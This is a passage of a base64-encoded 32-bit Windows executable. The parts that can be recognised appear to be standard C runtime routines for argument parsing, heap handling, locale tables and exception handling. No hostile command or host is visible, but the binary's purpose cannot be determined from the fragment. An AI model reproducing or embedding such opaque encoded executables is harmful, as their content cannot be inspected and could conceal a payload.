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i1QkNIP6/nQEO/J2Lo00do1csxCLC4lIDIN7BAB1zGgBAQAAi0MI6DITAAC5AQAAAItDCOhEEwAA67BkjwUAAAAAg8QYX15bw4tMJAT3QQQGAAAAuAEAAAB0M4tEJAiLSAgzyOjYzP//VYtoGP9wDP9wEP9wFOg+////g8QMXYtEJAiLVCQQiQK4AwAAAMNVi0wkCIsp/3Ec/3EY/3Eo6BX///+DxAxdwgQAVVZXU4vqM8Az2zPSM/Yz///RW19eXcOL6ovxi8FqAeiPEgAAM8Az2zPJM9Iz///mVYvsU1ZXagBSaJZEABBR6JwWAABfXltdw1WLbCQIUlH/dCQU6LX+//+DxAxdwggAagxoAIQAEOhC4P//ag7oUun//1mDZfwAi3UIi04Ehcl0L6HkpwAQuuCnABCJReSFwHQROQh1LItIBIlKBFDoQdX//1n/dgToONX//1mDZgQAx0X8/v///+gKAAAA6DHg///Di9DrxWoO6B7o//9Zw8zMzMzMzMzMzMzMzMzMi1QkBItMJAj3wgMAAAB1PIsCOgF1LgrAdCY6YQF1JQrkdB3B6BA6QQJ1GQrAdBE6YQN1EIPBBIPCBArkddKL/zPAw5AbwNHgg8ABw/fCAQAAAHQYigKDwgE6AXXng8EBCsB03PfCAgAAAHSkZosCg8ICOgF1zgrAdMY6YQF1xQrkdL2DwQLriIv/VYvsg30IAHUV6Gjz///HABYAAADolvj//4PI/13D/3UIagD/NSCgABD/FeBgABBdw4v/VYvsVot1CIX2D4RjAwAA/3YE6DLU////dgjoKtT///92DOgi1P///3YQ6BrU////dhToEtT///92GOgK1P///zboA9T///92IOj70////3Yk6PPT////dijo69P///92LOjj0////3Yw6NvT////djTo09P///92HOjL0////3Y46MPT////djzou9P//4PEQP92QOiw0////3ZE6KjT////dkjooNP///92TOiY0////3ZQ6JDT////dlToiNP///92WOiA0////3Zc6HjT////dmDocNP///92ZOho0////3Zo6GDT////dmzoWNP///92cOhQ0////3Z06EjT////dnjoQNP///92fOg40///g8RA/7aAAAAA6CrT////toQAAADoH9P///+2iAAAAOgU0////7aMAAAA6AnT////tpAAAADo/tL///+2lAAAAOjz0v///7aYAAAA6OjS////tpwAAADo3dL///+2oAAAAOjS0v///7akAAAA6MfS////tqgAAADovNL///+2vAAAAOix0v///7bAAAAA6KbS////tsQAAADom9L///+2yAAAAOiQ0v///7bMAAAA6IXS//+DxED/ttAAAADod9L///+2uAAAAOhs0v///7bYAAAA6GHS////ttwAAADoVtL///+24AAAAOhL0v///7bkAAAA6EDS////tugAAADoNdL///+27AAAAOgq0v///7bUAAAA6B/S////tvAAAADoFNL///+29AAAAOgJ0v///7b4AAAA6P7R////tvwAAADo89H///+2AAEAAOjo0f///7YEAQAA6N3R////tggBAADo0tH//4PEQP+2DAEAAOjE0f///7YQAQAA6LnR////thQBAADortH///+2GAEAAOij0f///7YcAQAA6JjR////tiABAADojdH///+2JAEAAOiC0f///7YoAQAA6HfR////tiwBAADobNH///+2MAEAAOhh0f///7Y0AQAA6FbR////tjgBAADoS9H///+2PAEAAOhA0f///7ZAAQAA6DXR////tkQBAADoKtH///+2SAEAAOgf0f//g8RA/7ZMAQAA6BHR////tlABAADoBtH///+2VAEAAOj70P///7ZYAQAA6PDQ////tlwBAADo5dD///+2YAEAAOja0P//g8QYXl3Di/9Vi+xWi3UIhfZ0WYsGOwXYmgAQdAdQ6LfQ//9Zi0YEOwXcmgAQdAdQ6KXQ//9Zi0YIOwXgmgAQdAdQ6JPQ//9Zi0YwOwUImwAQdAdQ6IHQ//9Zi3Y0OzUMmwAQdAdW6G/Q//9ZXl3Di/9Vi+xWi3UIhfYPhOoAAACLRgw7BeSaABB0B1DoSdD//1mLRhA7BeiaABB0B1DoN9D//1mLRhQ7BeyaABB0B1DoJdD//1mLRhg7BfCaABB0B1DoE9D//1mLRhw7BfSaABB0B1DoAdD//1mLRiA7BfiaABB0B1Do78///1mLRiQ7BfyaABB0B1Do3c///1mLRjg7BRCbABB0B1Doy8///1mLRjw7BRSbABB0B1Douc///1mLRkA7BRibABB0B1Dop8///1mLRkQ7BRybABB0B1Dolc///1mLRkg7BSCbABB0B1Dog8///1mLdkw7NSSbABB0B1bocc///1leXcPMzMzMzMzMi1QkDItMJASF0nRpM8CKRCQIhMB1FoH6gAAAAHIOgz1MqAAQAHQF6SsMAABXi/mD+gRyMffZg+EDdAwr0YgHg8cBg+kBdfaLyMHgCAPBi8jB4BADwYvKg+IDwekCdAbzq4XSdAqIB4PHAYPqAXX2i0QkCF/Di0QkBMOL/1WL7ItFCIXAdBKD6AiBON3dAAB1B1Doz87//1ldw4v/VYvsg+wQoQCQABAzxYlF/ItVGFMz21ZXO9N+H4tFFIvKSTgYdAhAO8t19oPJ/4vCK8FIO8J9AUCJRRiJXfg5XSR1C4tFCIsAi0AEiUUkizXoYAAQM8A5XShTU/91GA+VwP91FI0ExQEAAABQ/3Uk/9aL+Il98Dv7dQczwOlSAQAAfkNq4DPSWPf3g/gCcjeNRD8IPQAEAAB3E+j1CwAAi8Q7w3QcxwDMzAAA6xFQ6Gff//9ZO8N0CccA3d0AAIPACIlF9OsDiV30OV30dKxX/3X0/3UY/3UUagH/dST/1oXAD4TgAAAAizXkYAAQU1NX/3X0/3UQ/3UM/9aJRfg7ww+EwQAAALkABAAAhU0QdCmLRSA7ww+ErAAAADlF+A+PowAAAFD/dRxX/3X0/3UQ/3UM/9bpjgAAAIt9+Dv7fkJq4DPSWPf3g/gCcjaNRD8IO8F3Fug7CwAAi/w7+3RoxwfMzAAAg8cI6xpQ6Kre//9ZO8N0CccA3d0AAIPACIv46wIz/zv7dD//dfhX/3Xw/3X0/3UQ/3UM/9aFwHQiU1M5XSB1BFNT6wb/dSD/dRz/dfhXU/91JP8VjGAAEIlF+FfoGP7//1n/dfToD/7//4tF+FmNZeRfXluLTfwzzeiZw///ycOL/1WL7IPsEP91CI1N8Ojm5v///3UojUXw/3Uk/3Ug/3Uc/3UY/3UU/3UQ/3UMUOjl/f//g8QkgH38AHQHi034g2Fw/cnDi/9Vi+xRUaEAkAAQM8WJRfxTM9tWV4ld+DldHHULi0UIiwCLQASJRRyLNehgABAzwDldIFNT/3UUD5XA/3UQjQTFAQAAAFD/dRz/1ov4O/t1BDPA639+PIH/8P//f3c0jUQ/CD0ABAAAdxPo+QkAAIvEO8N0HMcAzMwAAOsRUOhr3f//WTvDdAnHAN3dAACDwAiL2IXbdLqNBD9QagBT6JX8//+DxAxXU/91FP91EGoB/3Uc/9aFwHQR/3UYUFP/dQz/FexgABCJRfhT6OL8//+LRfhZjWXsX15bi038M83obML//8nDi/9Vi+yD7BD/dQiNTfDoueX///91JI1F8P91HP91GP91FP91EP91DFDo6/7//4PEHIB9/AB0B4tN+INhcP3Jw+hO7P//hcB0CGoW6FDs//9Z9gVAmwAQAnQRagFoFQAAQGoD6Aju//+DxAxqA+jizv//zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxVi+xXVot1DItNEIt9CIvBi9EDxjv+dgg7+A+CoAEAAIH5gAAAAHIcgz1MqAAQAHQTV1aD5w+D5g87/l5fdQXp2AgAAPfHAwAAAHUUwekCg+IDg/kIcinzpf8klYBQABCLx7oDAAAAg+kEcgyD4AMDyP8khZRPABD/JI2QUAAQkP8kjRRQABCQpE8AENBPABD0TwAQI9GKBogHikYBiEcBikYCwekCiEcCg8YDg8cDg/kIcsz